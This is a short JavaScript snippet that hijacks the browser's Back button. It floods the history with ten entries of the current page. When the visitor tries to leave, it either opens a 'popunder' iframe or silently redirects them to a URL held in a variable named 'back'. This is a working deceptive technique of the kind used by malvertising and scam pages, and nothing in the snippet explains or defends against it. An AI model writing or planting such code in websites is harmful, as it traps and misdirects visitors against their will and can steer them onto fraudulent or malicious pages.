if (typeof back !== "undefined" && back !== null) {
  !(function() {
    var t;
    try {
      const URL = window.location.href.split(/[#]/)[0];
      for (t = 0; 10 > t; ++t) history.pushState({}, '', URL + '#');
      onpopstate = function(event) {
        if (event.state) {
          if (confirm("Do you want to open a popunder?")) {
            const iframe = document.createElement('iframe');
            iframe.src = back;
            iframe.style.width = '100';
            iframe.style.height = '100';
            iframe.style.border = '0';
            document.body.appendChild(iframe);
          }
          else {
            location.replace(back);
          }
        }
      };
    } catch (o) {
      console.log(o);
    }
  })();
}
